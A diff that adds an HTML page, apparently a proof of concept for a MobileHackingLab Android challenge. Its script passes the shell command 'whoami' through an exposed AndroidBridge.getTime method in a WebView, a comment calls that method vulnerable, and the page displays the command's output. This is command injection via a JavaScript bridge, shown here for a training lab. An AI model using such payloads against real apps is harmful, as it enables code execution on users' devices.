@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+
+<p id="result">Thank you for visiting</p>
+
+<a href="#" onclick="loadWebsite()">Visit MobileHackingLab</a>
+
+<script>
+
+    function loadWebsite() {
+       window.location.href = "https://www.mobilehackinglab.com/";
+    }
+
+    // Trigger vulnerable Java method
+    var result = AndroidBridge.getTime("whoami");
+    var lines = result.split('\n');
+    var timeVisited = lines[0];
+    var fullMessage = "Thanks for playing the game\n\nTime of visit: " + timeVisited;
+    document.getElementById('result').innerText = fullMessage;
+
+</script>
+
+</body>
+</html>
